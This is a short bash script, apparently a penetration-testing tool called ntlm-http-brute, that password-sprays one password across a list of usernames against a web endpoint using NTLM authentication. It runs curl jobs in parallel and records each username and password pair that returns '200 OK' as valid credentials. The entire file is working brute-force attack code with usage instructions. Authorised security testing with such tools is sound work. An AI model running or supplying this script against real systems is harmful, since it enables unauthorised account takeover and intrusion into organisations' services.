#!/bin/bash
# ntlm-http-brute v0.1 by James Gallagher
# Syntax: ntlm-http-brute.sh <URL> <threads> <username-input-file> <password>
# Example: ntlm-http-brute.sh https://example.com/page-that-prompts-for-ntlm-auth 12 list-of-usernames.txt Password123
# This tool requires parallel be installed 
# Tested on Kali Linux 2023.3
export url=$1
threads=$2
usernames=$3
export password=$4
export output=./ntlm-http-brute-results.txt
echo
echo ntlm-http-brute v0.1
echo
echo Beginning NTLM over HTTP brute force attack...
echo
brute() {
  i="$1"
  echo Testing $i:$password
  curl -v -s $url --ntlm -u $i:$password 2>&1 | grep -q '200 OK' && echo VALID CREDENTIALS FOUND: $i:$password - see $output for all results && echo $i:$password >> $output
}
export -f brute
parallel -j$2 brute <$usernames
echo
echo List of valid credentials, if any:
cat $output
echo
echo DONE - results saved to $output
